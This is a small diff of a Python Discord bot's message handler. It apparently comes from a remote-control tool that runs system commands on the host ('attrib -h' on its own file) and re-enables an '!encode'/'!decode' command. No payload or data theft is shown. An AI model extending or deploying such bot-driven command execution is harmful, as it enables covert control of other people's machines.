@@ -1283,7 +1283,8 @@ async def on_message(message):
             cmd237 = inspect.getframeinfo(inspect.currentframe()).filename
             os.system("""attrib -h "{}" """.format(cmd237))
             await message.channel.send("[*] Command successfuly executed")
-        #if message.content == "!decode" or message.content == "!encode":
+        #broken. might fix if someone want me too.
+        if message.content == "!decode" or message.content == "!encode":
             import os
             import base64
             def encode(file):
